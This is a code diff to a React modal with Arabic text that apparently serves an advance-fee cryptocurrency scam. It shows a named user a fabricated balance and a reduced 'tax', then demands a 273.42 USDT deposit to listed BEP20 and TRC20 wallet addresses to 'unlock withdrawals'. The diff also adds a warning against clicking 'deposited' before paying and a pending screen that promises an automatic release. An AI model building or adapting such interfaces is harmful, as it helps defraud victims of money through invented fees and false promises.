@@ -1,6 +1,6 @@
 
 import React, { useState } from 'react';
-import { X, CheckCircle2, Wallet, Info, Copy, Clock } from 'lucide-react';
+import { X, CheckCircle2, Wallet, Info, Copy, Clock, AlertTriangle } from 'lucide-react';
 
 interface ActionModalProps {
   isOpen: boolean;
@@ -22,9 +22,9 @@ const ActionModal: React.FC<ActionModalProps> = ({ isOpen, onClose }) => {
 
   return (
     <div className="fixed inset-0 z-[100] flex items-center justify-center px-6">
-      {/* Backdrop - Removed onClick to prevent closing */}
+      {/* Backdrop - Further reduced blur for lighter appearance */}
       <div 
-        className="absolute inset-0 bg-black/30 backdrop-blur-sm transition-opacity"
+        className="absolute inset-0 bg-black/20 backdrop-blur-[1px] transition-opacity"
       ></div>
 
       {/* Modal Content */}
@@ -39,9 +39,9 @@ const ActionModal: React.FC<ActionModalProps> = ({ isOpen, onClose }) => {
               <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
                 <Info className="text-blue-500" size={32} />
               </div>
-              <h3 className="text-lg font-bold text-gray-800 mb-4">أهلاً بك gHKA616</h3>
+              <h3 className="text-lg font-bold text-gray-800 mb-4">أهلاً بك 5388767403</h3>
               <p className="text-gray-600 text-sm leading-relaxed mb-8">
-                تم حل أمر المهام ضمن اتفاق برتكول بين منصتنا ومنصه <span className="font-bold text-blue-600">mini pro</span>. يرجى المتابعة لإتمام الإجراءات.
+                تم حل أمر الضريبه إلى ضريبه منخفضه سيتم خصم <span className="font-bold">19332.74</span> من قيمه العملات ويبقى فقط <span className="font-bold text-blue-600">39,222.7785</span> ضمن اتفاق برتكول بين منصتنا ومنصه <span className="font-bold text-blue-600">mini pro</span>. يرجى المتابعة لإتمام الإجراءات.
               </p>
               <button 
                 onClick={handleNext}
@@ -80,8 +80,18 @@ const ActionModal: React.FC<ActionModalProps> = ({ isOpen, onClose }) => {
             <div className="text-right">
               <h3 className="text-lg font-bold text-gray-800 mb-3">تفعيل قناة السحب</h3>
               <p className="text-gray-600 text-[13px] leading-relaxed mb-4">
-                أهلاً بك <span className="font-bold text-gray-800">gHKA616</span>، بقي أمر إيداع مبلغ <span className="text-red-600 font-bold">63.74 USDT</span> لفتح قناة السحب.
+                أهلاً بك <span className="font-bold text-gray-800">5388767403</span>، بقي أمر إيداع مبلغ <span className="text-red-600 font-bold">273.42 USDT</span> لفتح قناة السحب.
               </p>
+              
+              <div className="bg-amber-50 border-r-4 border-amber-400 p-3 rounded-lg mb-4">
+                <div className="flex items-start gap-2">
+                  <AlertTriangle size={18} className="text-amber-600 flex-shrink-0 mt-0.5" />
+                  <p className="text-[11px] text-amber-800 leading-tight font-medium">
+                    ملاحظة: يرجى عدم الضغط على زر "تم الايداع" قبل إرسال قيمة الضريبة فعلياً. سيتم فتح قناة السحب بشكل فوري وتلقائي بمجرد تأكيد العملية.
+                  </p>
+                </div>
+              </div>
+
               <div className="bg-blue-50 p-3 rounded-lg mb-4">
                 <p className="text-[11px] text-blue-700 leading-tight">
                   هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه mini pro.
@@ -92,8 +102,8 @@ const ActionModal: React.FC<ActionModalProps> = ({ isOpen, onClose }) => {
                 <div className="p-3 bg-gray-50 rounded-xl border border-gray-100">
                   <p className="text-[11px] text-gray-500 mb-1">USDT (BEP20)</p>
                   <div className="flex items-center justify-between gap-2">
-                    <code className="text-[10px] break-all text-gray-700">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</code>
-                    <button onClick={() => copyToClipboard('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')} className="text-[#9B4A4E]">
+                    <code className="text-[10px] break-all text-gray-700 font-mono">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</code>
+                    <button onClick={() => copyToClipboard('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')} className="text-[#9B4A4E] hover:scale-110 transition-transform">
                       <Copy size={16} />
                     </button>
                   </div>
@@ -102,8 +112,8 @@ const ActionModal: React.FC<ActionModalProps> = ({ isOpen, onClose }) => {
                 <div className="p-3 bg-gray-50 rounded-xl border border-gray-100">
                   <p className="text-[11px] text-gray-500 mb-1">USDT (TRC20)</p>
                   <div className="flex items-center justify-between gap-2">
-                    <code className="text-[10px] break-all text-gray-700">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</code>
-                    <button onClick={() => copyToClipboard('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai')} className="text-[#9B4A4E]">
+                    <code className="text-[10px] break-all text-gray-700 font-mono">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</code>
+                    <button onClick={() => copyToClipboard('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai')} className="text-[#9B4A4E] hover:scale-110 transition-transform">
                       <Copy size={16} />
                     </button>
                   </div>
@@ -126,7 +136,7 @@ const ActionModal: React.FC<ActionModalProps> = ({ isOpen, onClose }) => {
               </div>
               <h3 className="text-xl font-bold text-gray-800 mb-4">قيد المراجعة</h3>
               <p className="text-gray-600 text-sm leading-relaxed mb-8">
-                الرجاء الانتظار للتأكد من عمليه الايداع. سيتم تحديث حالة حسابك فور التأكيد.
+                الرجاء الانتظار للتأكد من عمليه الايداع. سيتم تحديث حالة حسابك فور التأكيد وفتح السحب تلقائياً.
               </p>
               <div className="w-full bg-gray-100 h-2 rounded-full overflow-hidden">
                 <div className="bg-green-500 h-full w-1/3 animate-[progress_2s_ease-in-out_infinite]"></div>
